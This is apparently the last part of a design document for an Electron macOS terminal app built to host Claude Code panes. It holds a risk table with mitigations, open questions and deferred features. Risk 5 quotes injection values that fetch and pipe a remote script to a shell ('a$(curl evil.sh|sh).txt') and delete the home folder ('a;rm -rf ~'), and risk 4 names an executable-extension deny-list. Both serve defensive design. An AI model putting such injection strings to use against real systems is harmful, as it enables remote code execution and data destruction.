| 1 | **blocker** | `node-pty@1.1.0` ships `spawn-helper` mode 0644 with no `chmod` anywhere. Every `pty.spawn` throws `Error: posix_spawnp failed.` Reproduced on this host. Bites in CI, under pnpm, and inside the packaged `.app` where postinstall never ran. npm 11.17 also gates lifecycle scripts behind `npm approve-scripts`. | `chmod 0755` in three places: repo `postinstall`, `afterPack` on the universal app, and a startup `fs.accessSync(helperPath, X_OK)` self-check that shows a modal. Plus a `pty` smoke test that fails loudly on `posix_spawnp`. |
| 2 | **blocker** | `electron-builder`'s `npmRebuild` defaults to `true`. It rebuilds node-pty for the host arch into `build/Release`, which node-pty's loader prefers over `prebuilds/`, producing a "universal" app whose PTY layer is x86_64-only. Passes every test on this Intel host, hard-fails on every M-series Mac. | `npmRebuild: false` and `buildDependenciesFromSource: false`. CI gate fails if `node_modules/node-pty/build/Release` exists, plus a `lipo -info` assertion on all four universal binaries before packaging. |
| 3 | **blocker** | Unsigned or improperly signed arm64 code is SIGKILLed on Apple Silicon. The Intel developer host cannot detect this. | Never publish an unsigned universal build. Gate releases on `codesign -v --deep --strict -a arm64`, `spctl --assess`, and `xcrun stapler validate`, plus a real Apple Silicon smoke launch (§15.6). |
| 4 | **blocker** | `shell.openPath` on `.app`/`.command`/`.jar`/`.pkg`/`.scpt`/`.webloc`/`.terminal` or any executable **runs** it. Terminal output is attacker-influenced (branch names, remote log lines, filenames in a cloned repo), so a hostile repo containing `pwn.command` printed and double-clicked is arbitrary code execution. | Main-process DENY gate (§8.6) before any `openPath`, evaluated **against the realpath** so a symlink cannot launder the target: extension deny-list, `mode & 0o111` without a document extension, FIFO/socket/device, anything under `/dev` → `shell.showItemInFolder` + notice. Unit-test every DENY member. |
| 5 | **blocker** | Command injection if an implementer reaches for `open(1)`: `exec('open ' + p)` with `a$(curl evil.sh|sh).txt` or `a;rm -rf ~` runs a shell. | `shell.openPath` never involves a shell. ESLint `no-restricted-properties` bans `child_process.exec`/`execSync` across `src/main/**`; `lsof` and `ps` use `execFile` with argv arrays. |
| 6 | **blocker** | Option is the only modifier that escapes mouse reporting on macOS, and `altClickMovesCursor` defaults to `true` — an Option-click with an empty selection injects arrow-key bytes into Claude Code's input box. | `altClickMovesCursor: false`. Regression test in the `dom` project asserts zero bytes written during an Option+double-click while DECSET 1000 is active (§16.2). |
| 7 | **blocker** | **The CSP breaks xterm.js.** `style-src 'self'` with no `'unsafe-inline'`, nonce or hash blocks the `<style>` element `Viewport.ts:79` creates for **every** terminal, plus the two `DomRenderer` creates — and xterm 6.0.0 has no nonce hook (zero `nonce` hits in its source). The DOM renderer is a reachable steady state (§4.5), so this is not a corner case. | `style-src 'self' 'unsafe-inline'` (§13.1). Startup dev-mode assertion that the scrollbar slider has a non-empty computed background, failing loudly if the style element was ever blocked. The `no innerHTML` rule stays, justified by injection rather than CSP. |
| 8 | **blocker** | **A renderer crash orphans every live PTY** on a 16 GB machine — the exact failure mode SeaShell exists to prevent. Main owns every `IPty`; the reloaded renderer has fresh pane IDs, never acks the old ones, so `unacked` climbs past 1 MiB and every orphan is `pause()`d permanently with its `claude` children alive and invisible. §11.2 would then offer Restore buttons spawning a second set of six. | On `render-process-gone` **and** `destroyed`: run every session's kill ladder in parallel, clear the batcher and all `unacked`, bump `rendererEpoch`, then reload (§6.5). `pty` case 11 asserts zero survivors across three panes. |
| 9 | high | Setting `COLORTERM=truecolor` (a tempting default, and one research draft recommended it) puts Claude Code on its 24-bit code path, producing visibly different shades from Terminal.app. Instant fidelity violation. | Hard-delete `COLORTERM`; `TERM=xterm-256color`; unit test asserts the key is absent. **No per-pane truecolor toggle exists** (§4.3) — it had no wire representation and contradicted the renderer-cannot-influence-env rule. |
| 10 | high | Masquerading as `TERM_PROGRAM=Apple_Terminal` to force the 8-bit path would let `/terminal-setup` back up, rewrite, and `killall cfprefsd` on the user's real `~/Library/Preferences/com.apple.Terminal.plist` from inside SeaShell. | Never set it. `xterm-256color` already yields the identical palette. Shift+Enter — the only thing `/terminal-setup` provides — is bound natively to `0x1b 0x0d`, **scoped to panes with mouse tracking on** so plain shells keep Terminal.app's behavior. |
| 11 | high | **Synthetic bold and synthetic italic.** `new FontFace(family, buf)` with no descriptors declares weight 400–400, so xterm's request for `bold` is clamped and Chromium fakes it; SGR 3 gets a fake oblique. `SFMono-Terminal.ttf`'s `fvar` default weight is 294.67 (`Light`) and a separate `SFMonoItalic-Terminal.ttf` exists and was never loaded. Claude Code uses bold constantly, so checklist row 6 was guaranteed to fail. | Load **both** files with `{weight: '295 900'}` and the correct `style`, await both before the first `term.open()`, and assert `document.fonts.check` for bold and italic at startup (§4.2). |
| 12 | high | Six WebGL2 contexts per tab across multiple tabs exceeds Chromium's ~16-per-renderer cap; the oldest are force-lost and panes blank silently. | Two-tab LRU over `WebglAddon` (≤ 12 live), `--max-active-webgl-contexts=32`, `onContextLoss` → DOM renderer with one retry after 1 s (§4.5). `e2e` case 1 asserts ≤ 12 across 8 tabs × 6 panes. |
| 13 | high | Creating any GL context on this 2019 MBP promotes it to the AMD Radeon Pro 5300M and pins it there: +10–15 W, fans, and this machine's documented thermal throttling. Disposing and recreating six contexts on every tab switch would make this worse. | `NSSupportsAutomaticGraphicsSwitching: true` in `mac.extendInfo`, plus the LRU above so tab switching does not churn contexts. Acceptance: 6 idle panes → total CPU < 2% and the dGPU not engaged. |
| 14 | high | **The OSC 7 encoder silently produced wrong cwds.** The clever one-liner needed `extendedglob` (off by default, so the substitution did nothing), split by characters rather than bytes (so `日` → `%65E5` instead of `%E6%97%A5`), and did not zero-pad bytes below `0x10`. Every cwd-relative linkified path in that pane would resolve against a wrong directory, silently. | Apple's `update_terminal_cwd` body copied verbatim from `/etc/zshrc_Apple_Terminal`, including `local i ch hexch LC_CTYPE=C LC_COLLATE=C LC_ALL= LANG=` and `printf -v hexch "%02X" "'$ch"` (§6.2). `pty` case 14 round-trips `~/Desktop/日本 test`. |
| 15 | high | **`paneProcs`'s tty arm is a mass-kill hazard.** 740 of 751 processes on this host report tty `??`. If `pane.tty` were ever empty or malformed, the tty arm would select nearly every daemon on the machine and the ladder would `kill(-pgid, SIGKILL)` all of them. There was also no uid filter. | Build the tty arm **only** when `pane.tty` matches `/^ttys\d+$/`; filter every sweep row to `process.getuid()`; fail `pty:spawn` with `ETTY` rather than storing a junk value (§6.5). `ps-parse` fixture contains `??` and other-uid rows. |
| 16 | high | Whole-file shiki tokenization blocks the UI: 3,697 ms for 10,003 lines on this host, and `codeToHtml` would emit 4.18 MB of HTML. Additionally, **wasm is blocked outright** by any CSP lacking `'wasm-unsafe-eval'` since Chrome 97, so the oniguruma engine would simply never run. | Never call `codeToHtml`. Use `createJavaScriptRegexEngine()` (no wasm, `script-src` stays `'self'`). Plain text within one frame, then 500-line chunks in `requestIdleCallback` threading `grammarState` (verified byte-identical). Refuse > 8 MiB, plain-text > 2 MiB (§9). A `dom` test asserts the highlighter produces tokens. |
| 17 | high | Stat storm: dragging across a dense build log invokes `provideLinks` per hovered line, 10–40 candidates each, thousands of syscalls/second on a host that already swaps. | 32 ms coalescing, **≤ 256 paths/batch enforced by zod**, ≤ 20 batches/sec/terminal, in-flight `Set`, ≤ 64 candidates/line, 60 ms trailing debounce, 4096-entry cache with 60 s positive / 10 s negative TTL. |
| 18 | high | Using `visibility:hidden` / `opacity:0` / off-screen transform for hidden panes instead of `display:none`: those still report as intersecting, so xterm never pauses rendering and all background panes keep drawing — invisible in code review. | Enforce `display:none` in the pane-visibility CSS; `dom` test asserts the computed value; `e2e` case 2 asserts hidden terminals' `onRender` fires zero times. |
| 19 | medium | **Copy, paste and the folder picker were unbuildable.** The frozen preload object exposed no clipboard and no `dialog`, and the renderer is sandboxed, so ⌘C, ⌘V and every route to setting a tab's cwd had no transport. | `clipboard: {readText, writeText}` and `app.pickFolder` added to the preload surface, backed by `clip:read` / `clip:write` / `app:pickFolder` (§12), with the 100 KB cap enforced in main. |
| 20 | medium | **Most of the §14 error table was unimplementable**: nine rows described messages whose triggers live in main, and there was no main→renderer notice channel at all. | `ui:notice` / `ui:noticeAction` (§12), every §14 row annotated with its code, and a test asserting the emitted-code set equals the documented set. |
| 21 | medium | **`tab.cwd` was never set by anything.** It rooted the explorer, seeded every spawn, and was persisted, but there was no folder picker, no ⌘T cwd rule, and no tab-rename UI — so every tab would be stuck at `cwdOfLaunch` (which is `/` for a Finder launch) forever, and §2.2's three differently-rooted tabs were unreachable. | `app:pickFolder`, File ▸ New Tab (inherits the active tab's cwd, else `$HOME`), File ▸ Open Folder in New Tab (⇧⌘O), Set folder… in the tab context menu, double-click-to-rename with a `nameIsCustom` latch, and the rule that `tab.cwd` is fixed for the tab's lifetime (§5.5). |
| 22 | medium | **First run was undefined.** A missing state file is not a corruption, and §11.2 only described restoring saved panes — so a fresh install opened to zero tabs or to a Restore card for a pane that never existed. | `recovered: 'first-run'` → one tab at `$HOME` with **one live pane**, stated explicitly as the sole exception to "never auto-run" (§11.2). |
| 23 | medium | **Two SeaShell instances last-writer-wins the state file**, silently erasing the first instance's layout on quit — and this user has a documented habit of forgetting running sessions. | `app.requestSingleInstanceLock()` before window creation; focus the existing window and quit (§11.3). |
| 24 | medium | **Restore into a stale cwd fails forever.** The persisted cwd is exactly the one most likely to be gone (removed worktree, cleaned `/tmp`, unmounted volume), and `ECWD` made Restore and its Retry action fail identically every time. | Main walks the requested cwd up to the nearest existing readable ancestor, falling back to `$HOME`, spawns successfully, and returns `cwdFallback` for a one-line pane notice. `ECWD` reserved for an unreadable `$HOME` (§6.1). |
| 25 | medium | **`before-quit` cancelled pending an unbounded renderer round trip**: a hung renderer means the quit never completes and the user Force Quits, orphaning every PTY — the exact outcome the busy-pane modal exists to prevent. Six serial kill ladders would also beachball for ~18 s. | The §6.5 quit state machine: `preventDefault` once, `app:quitReply` with a 2,000 ms timeout, main-owned `dialog.showMessageBox`, ladders **in parallel** under a 4,000 ms global budget, then `app.exit(0)`. |
| 26 | medium | **A post-crash reload leaves every PTY paused forever**: main's pre-crash `unacked` counters can never be acked by a renderer with fresh pane IDs. The app returns looking alive with dead terminals. | `rendererEpoch` on every `did-finish-load`; stale-epoch acks discarded; on epoch change zero every `unacked` and `resume()` unconditionally (§6.6). Unit-tested. |
| 27 | medium | `@electron/universal` throws `Detected file "…" that's the same in both x64 and arm64 builds…` because both slice-apps carry identical thin prebuilds. | Pre-`lipo` node-pty's `pty.node` and `spawn-helper` into fat binaries written identically into **both** prebuild directories, taking the `isUniversalMachO` fast path. Verified. Fallback: `mac.x64ArchFiles: "**/node-pty/prebuilds/**"`. |
| 28 | medium | `afterPack` fires three times for a universal build (x64, arm64, merged). A hook assuming one invocation corrupts half-built per-arch apps. | Branch every hook on `context.arch === Arch.universal` (enum value 4). |
| 29 | medium | electron-builder's bundled entitlements template includes `allow-unsigned-executable-memory`, which `@electron/notarize` says must not be used on Electron 12+. | Commit `build/entitlements.mac.plist` with only `allow-jit` and `disable-library-validation`; reference from `entitlements` **and** `entitlementsInherit`; assert with `codesign -d --entitlements -` in the release gate. |
| 30 | medium | Cell-width rounding: WebGL floors device cell width, so a wrong font size compresses every glyph — 0.61816 em at 12px loses 0.836 device px/cell, ~33 CSS px drift over 80 columns. The user's own Terminal profile is set to 14 pt, whose residual is 0.309. | Ship 13px (residual 0.072). Compute the residual at startup and warn above 0.15. 17px (0.018) is the other clean size; Menlo → 10 or 15px; Andale Mono → 10px (§4.2, §18 q2). |
| 31 | medium | Resize thrash: dragging a divider fires continuous `ResizeObserver` callbacks; each `pty.resize` sends SIGWINCH and Claude Code's Ink reconciler redraws, causing flicker and torn output. | 80 ms trailing debounce per pane; skip `pty.resize` when `{cols,rows}` is unchanged (verified: identical `TIOCSWINSZ` delivers no SIGWINCH); xterm first, PTY second; `reflowCursorLine: false`. |
| 32 | medium | xterm's buffer reflow is not an exact inverse — shrink-then-grow loses trailing-whitespace fidelity, so repeated divider dragging degrades a Claude transcript's scrollback. | Zoom is view-only so it never reflows. Debounced resize means one SIGWINCH per drag, not dozens. `pty` case 6 asserts non-whitespace content is preserved through 120 → 40 → 120. |
| 33 | medium | PTY output outruns the renderer during a large `cat` or long response, blowing memory on a swapping machine. xterm's own `WriteBuffer` hard-discards above 50 MB, which is silent data loss. | Ack window: `pause()` above 1 MiB unacked, `resume()` below 256 KiB (verified real kernel backpressure). Never drop bytes. `scrollback: 5000`. |
| 34 | medium | A double-forked process reparents to launchd before the sweep and survives pane close. | Union the ppid subtree with every same-uid process whose tty matches the pane's — verified to catch a `(sleep 601 &)` at ppid 1. Residual gap (also detaching the ctty) is surfaced as `REAP_SURVIVORS` with pid + comm, never hidden. |
| 35 | medium | **`IPty` has no `dispose()`.** The old step 7 called one; verified against `node-pty@1.1.0`'s typings, the interface is exactly `pid, cols, rows, process, handleFlowControl, onData, onExit, resize, clear, write, kill, pause, resume`. The master fd is released only when the child exits and `onExit` fires, so a surviving process meant an unbounded fd leak with no recovery step. | Ladder step 5 awaits `onExit` with a 2,000 ms timeout, logging `PTY_FD_LEAK` and counting it in survivors (§6.5). `pty` case 13 guards fd growth over 200 pane cycles. `ulimit -n` is 1,048,576 on this host. |
| 36 | medium | `ptsName` is not on node-pty's public `IPty` interface, so reading it is a compile error under `strict: true` / TS 7 — and an inline `as any` would hide a real breakage on upgrade. | A single module augmentation in `src/main/pty/manager.ts`, sound because the build is Unix-only, listed in the §15.9 upgrade gate. |
| 37 | medium | OSC 7 is parsed in the renderer but every consumer (`lsof` gating, `metrics:tick.cwd`, persistence, restart cwd) lives in main, so main could neither gate the sampler nor report the right cwd. | `pane:cwd` (§12), throttled to one message per prompt; main stores `{cwd, at}` per pane and is the single authority for 5,000 ms (§8.5). |
| 38 | medium | Coordinate mapping via `.xterm-screen`'s bounding rect drifts from xterm's internal cell dimensions after a font-size change, a DPR change, or a CSS transform, giving off-by-one-cell lookups. | Recompute the rect on every `dblclick`, never cache. Derive `cellW = rect.width/cols`, subtract computed padding, `Math.ceil` + clamp. Never CSS-transform the terminal host. Fixture-table unit test. |
| 39 | medium | Bare unquoted paths with spaces cannot be tokenized unambiguously; greedy matching linkifies wrong text. A double-click-only fallback would make hover and open disagree by construction. | Documented limitation (§8.2): quoted and backslash-escaped spaces are fully supported at both hover and double-click; bare unquoted spaced paths are supported nowhere. The unique-prefix fallback is deleted; a unit test asserts hover and double-click spans are identical for every fixture. |
| 40 | medium | Wide characters desynchronize string index from cell column, underlining and opening the wrong span. | Build `idxMap` during the cell-by-cell join: skip `getWidth() === 0`, push `(y, x+1)` once per appended UTF-16 unit. Unit-tested with CJK, Cyrillic, and emoji. |
| 41 | medium | An 800 MB core dump or 2 GB log double-clicked into the viewer OOMs a machine that already swaps — and two disagreeing binary tests meant a latin-1 log routed one way at probe time and another at open time. | One `classify()` in `route.ts` used by `fs:probe`, `fs:readTextFile` and the double-click router, with the five constants pinned once (§8.6). > 8 MiB never enters the viewer; > 2 MiB or > 5,000-char lines load unhighlighted; windowed rendering; hard truncate at 200,000 lines. |
| 42 | medium | A symlink loop (`ln -s .. loop`) inside an open tree makes explorer expansion infinitely deep; a broken symlink was never linkified despite `lstat` succeeding; and a symlink to an `.app` bypassed DENY. | `resolve → lstat → realpath → DENY-on-realpath` (§8.3); `fs:readDir` returns `cycle: true` when an entry's realpath equals or prefixes an open ancestor's; `dangling: true` links still render (§7). |
| 43 | medium | Restoring window geometry verbatim onto a display that no longer exists (external monitor unplugged — documented for this user) opens the window fully off-screen with no way to reach it. Recomputing `setMinimumSize` per layout could also exceed the work area, which macOS ignores. | Intersect the restored rect with the matching display's `workArea` and recenter below 50% overlap (§11.2). One startup `setMinimumSize` for the worst legal layout, clamped to `workArea − 40` (§5.3). |
| 44 | low | `Cmd+A` fired twice: the `appFocusZone` handler **and** xterm's internal `SELECT_ALL`, because the key handler excluded `'a'` from its meta guard. | `if (ev.metaKey) return false` unconditionally (§4.3); the zone handler is the single owner and calls `term.selectAll()` (§5.5). Never use `role:` for selectAll/copy/paste. |
| 45 | low | ⌘W with the viewer focused would run the kill ladder on a live `claude` pane behind the panel, because `appFocusZone` had no `'viewer'` member and menu accelerators fire regardless of DOM focus. | Add `'viewer'` to the union and route ⌘W / ⌘A / ⌘C through it; Escape restores the previous zone (§5.5). `dom` test asserts the pane session survives. |
| 46 | low | Injecting `claude\r` into stdin after "first `onData` byte or 300 ms" races a real `.zshrc`; the app's primary flow would intermittently yield an empty shell or a garbled command line. | `SEASHELL_RUN` evaluated by the ZDOTDIR shim after the user's config is sourced — deterministic, no timing at all, and `print -s` still records it in history (§6.1, §6.2). `pty` case 15 guards it against an 800 ms `.zshrc`. |
| 47 | low | `titleBarStyle: 'hiddenInset'` removes the title bar, so with no declared drag regions the window cannot be moved and the first tab sits under the traffic lights. | Tab bar is the only `-webkit-app-region: drag` surface with `padding-left: 78px`; tabs, `+`, and close buttons declare `no-drag` explicitly; a `.fullscreen` class zeroes the padding (§2.2). |
| 48 | low | Braille (U+2800–U+28FF) has no monospace font on macOS; Claude Code's binary contains 46 distinct braille codepoints and `customGlyphs` does not cover them. | Pin `Apple Symbols` explicitly as the third fallback so the choice is deterministic; `rescaleOverlappingGlyphs: true`. Checklist row 9 covers it. No contiguous ≥5-frame braille spinner run was found in the binary, so this is cosmetic, not blocking. |
| 49 | low | Notarization is asynchronous and Apple can reject for reasons that surface only after upload. | Budget 2–15 min, `--wait --timeout 30m -f json`, pull `xcrun notarytool log <id>` on rejection, `gatekeeperAssess: false` so failures surface at the explicit verification step. |
| 50 | low | A crash mid-write leaves truncated JSON, or a durable-looking `rename` that never reached disk because the containing directory was not fsynced. | Atomic write `tmp → fh.sync → close → rename → dir.sync`, zod validation on load, corrupt file preserved as `state.corrupt-<ISO>.json`, defaults returned (§11.3). Fixture-tested against truncated, empty, `{}`, and future-version inputs, with call order asserted. |
| 51 | low | `state:save` failing on a full disk loses the layout with no user-visible signal. | `STATE_SAVE_FAILED` notice with a **Retry** action; the app does not block quit on it (§14). |

---

## 18. Open questions

1. **Signing identity.** Confirm the Apple Developer Team ID and whether SeaShell reuses the existing BearScout **Developer ID Application** certificate or gets its own. This affects only which `CSC_LINK` and Team ID are used — not the build design, which is complete either way. Default assumption if no answer arrives before the first release build: reuse the BearScout Developer ID Application certificate under the same Team ID, since a Developer ID cert is per-team and not per-app.
2. **Shipped font size: 13px or 17px?** The user's Terminal profile is set to 14 pt, whose device-pixel residual (0.309) makes it unusable in a floor-rounding renderer. 13px (residual 0.072) is slightly smaller than habitual; 17px (0.018) is noticeably larger. §4.2 ships 13px pending an answer. This is a one-constant change and does not affect any other section.
3. **Bold text colour.** Terminal.app's Homebrew profile applies a distinct `TextBoldColor` (`#00FF00`) that xterm's `ITheme` cannot express (§4.4). Options: accept the 24/255 single-channel difference (current plan, recorded in checklist row 6), or fork a bold-foreground patch into the renderer (out of proportion). Confirm the difference is acceptable in the M0 side-by-side.

---

## 19. Deferred — specified, not built

Everything here was designed, costed, and consciously moved out of v1. Nothing here is discarded; each entry keeps enough detail to be built later without re-deriving it.

### 19.1 Physical footprint instead of RSS (§10.2)

The upgrade to buy if RSS ordering proves misleading in daily use. Measured on five live forgotten Claude Code sessions on this machine:

| pid | `ps` RSS | `phys_footprint` |
|---|---|---|
| 69559 | 274 MiB | **766 MB** |
| 68844 | 393 MiB | 663 MB |
| 8582 | 291 MiB | 557 MB |
| 35411 | 326 MiB | 455 MB |
| 66274 | **393 MiB** | 327 MB |

RSS ranks these in a **different order** than footprint. It excludes compressed and swapped pages, so the most neglected pane looks the smallest; it excludes IOAccelerator memory (504 MB of pid 8582's 557 MB); and it double-counts ~156 MB of shared clean `__TEXT`/`__DATA_CONST` in every pane mapping the same 254 MB `claude` binary. `ri_phys_footprint` was verified to match `/usr/bin/footprint -p` and `top -stats mem` exactly.

Implementation: a ~60-line C binary `native/procsweep.c`, compiled `clang -O2 -arch x86_64 -arch arm64 -mmacosx-version-min=11.0`, calling `proc_listpids(PROC_ALL_PIDS)` then per pid `proc_pidinfo(pid, PROC_PIDTBSDINFO, …)` and `proc_pid_rusage(pid, RUSAGE_INFO_V4, …)`, emitting TSV `pid ppid pgid e_tpgid e_tdev phys_footprint cpu_ns comm`. Measured **10 ms wall / ~5 ms CPU for all ~500 same-uid processes** — 11× cheaper than `ps` and 290× cheaper than `top -l 1`. No entitlement needed (libproc, not `task_for_pid`).

**Cost of buying it**, and why it is not in v1: `extraResources`, a `postinstall` clang step (making clang a hard build dependency everywhere including CI), two `afterPack` chmod/lipo assertions, one CI gate, one additional notarized artifact, plus `procsweep.ts` and a TSV fixture. Note the `e_tdev` NODEV guard: a process with no controlling terminal reports `e_tdev = 0xFFFFFFFF`, so the §6.5 tty-arm guard becomes `pane.tdev !== 0xFFFFFFFF && pane.tdev !== 0` and `pty:spawn` fails with `ETDEV` rather than storing a junk `statSync(ptsName).rdev`.

### 19.2 The system memory gauge (§10.3)

Not requested by any approved decision; decision 7 asked for one number. Specified in full for later:

```
app      = (internal_page_count - purgeable_count) * pagesize
used     = app + wire_count * pagesize + compressor_page_count * pagesize
headline = `${used} / ${hw.memsize}`          // e.g. "12.2 / 16.0 GB (76%)"
```

This closes exactly — `used + (external + purgeable) + (free - speculative) = 16.00 GiB` — and matches Activity Monitor, so it is checkable. "Used" alone lies: measured during design, Used 12.21 / 16.00 GiB (76%) with `kern.memorystatus_vm_pressure_level = 1` (NORMAL) and `kern.memorystatus_level` claiming "57% free" — while free RAM was 0.11 GiB, swap was 4.50 of 6.00 GB, and the compressor held **15.30 GiB of data in 1.64 GiB of RAM (9.31×)**. So the second status-bar line would be permanent secondary text, not a tooltip:

```
compressed 1.6 GB (holding 15.3 GB, 9.3x) · swap 4.5/6.0 GB
```

coloured by a composite, never by pressure level alone: **red** if `level == 4` or `used/total ≥ 0.90` or `swapUsed/swapTotal ≥ 0.75`; **amber** if `level == 2` or `used/total ≥ 0.80` or `swapUsed/swapTotal ≥ 0.40` or compressor ratio ≥ 5.0; **green** otherwise. Plus the rate-limited "SeaShell panes are using 11.2 GB" toast and a **Show heaviest panes** sheet with per-pane Close buttons. Requires the `SYS` line from `host_statistics64(HOST_VM_INFO64)`, `sysctl hw.memsize`, `sysctl vm.swapusage`, and `sysctl kern.memorystatus_vm_pressure_level`, i.e. it depends on §19.1.

### 19.3 CPU-calibrated busy/waiting states (superseded §10.3)

The three-state machine `PROMPT / BUSY / WAITING`, driven by `e_tpgid` plus a CPU-delta fraction:

```
shell.e_tpgid === shell.pid                        → PROMPT
cpuDelta / windowNs > 0.08  ||  bytesThisTick > 0  → BUSY
otherwise                                          → WAITING
```

The 0.08 threshold is calibrated on measurement: idle `claude` panes burn 0.06–0.22 s per 6 s window (1–3.7% of a core); genuinely working ones burn 1.41–1.65 s (23–28%). Roughly 3× headroom on both sides.

**`cpuDelta` must be defined across a changing process set**, which the original text did not do. `cpu_ns` is per-process cumulative, and a pane's process set changes between ticks — naively summing and differencing yields a large **negative** delta when a busy child exits, and misses all CPU burned by a child that both started and finished inside one window. The correct definition:

```
cpuDelta = Σ over pids present in BOTH samples of (cpu_ns_now − cpu_ns_prev)
         + Σ over pids new in this sample of cpu_ns_now
         , clamped at ≥ 0 ; pids that disappeared contribute nothing
windowNs = wall-clock delta between the two sweeps
           (NOT the nominal 5,000 ms — the poller drops to 30 s when hidden
            and the window must follow)
```

Its `ps-parse` test needs a fixture where a child exits between ticks.

### 19.4 Other deferred items

| Item | Where it was | Why deferred |
|---|---|---|
| **Live file watching** | §7, `watcher.ts`, `watch:subscribe` / `watch:unsubscribe` / `watch:changed`, 64-handle LRU pool keyed on last-**rendered** time, 250 ms per-path debounce, never watch an ignored directory. Would additionally need a `watch:evicted` event (or an `evicted: string[]` field on `watch:subscribe`) so the renderer can mark evicted nodes `stale: true` — without it a directory silently stops updating. | Not an approved requirement, and §7 already concedes correctness never depends on it. macOS `fs.watch` filenames are unreliable enough that the payload must be discarded entirely. ⌘R, window focus and expand-refresh cover it. |
| **⌘F find-in-pane** (`@xterm/addon-search`) and **⌘F in the viewer** | §3, §5.5, §9 | Not requested. Costs a dependency, a keybinding, a find-bar component and its focus handling. Reinstating it means re-adding a `'viewer'`-zone ⌘F row to §5.5's dispatch table. |
| **OSC 52 clipboard writes** (`@xterm/addon-clipboard`) | §3, §4.1, §13.2 item 5 | **Terminal.app does not support OSC 52**, so supporting it is a deviation from the fidelity target, not a requirement of it. If added: a custom `IClipboardProvider` whose `readText` returns `''` unconditionally and whose `writeText` accepts ≤ 100 KB only when the owning pane is focused. |
| **`tab.pristine`, Rebalance (⌘⇧R), and the one-time reflow hint** | §5.2, §5.5, §11.1, old risk 33 | Three features managing a consequence of the first one; none requested. Revisit only if proportional reflow-after-close feels wrong in real use. |
| **Directional pane focus** (`Cmd+Alt+arrows`) and **divider nudge** (`Cmd+Alt+Shift+arrows`) | §5.5 | Directional focus needs a geometry-based rect search generalized in four directions; nudge is an entire second resize input path. ⌘]/⌘[ and pointer drag cover both for six panes. |
| **New Pane in New Column** (`Cmd+Shift+D`) | §5.5 | A manual placement mode that contradicts the approved auto-arranged grid and forks the §5.2 insert rule. |
| **MSBuild `(line,col)` suffix form** | §8.2 | tsc emits `:line:col` too, so nothing is lost; the second regex interacts badly with balanced-bracket stripping in the same pass. |
| **Viewer light theme** (`github-light`) | §9 | Unreachable dead configuration under the one-theme rule. A light viewer is a design change requiring approval. |
| **`migrate.ts` schema migrations** | §11.3 | One schema version exists and the app has zero users. Reinstate at `schemaVersion: 2`. |
| **A GitHub Actions release pipeline** (`--publish always` with Apple secrets) | §15.8 | One user, one machine. CI keeps the guards that run on every push; signing material stays local. |
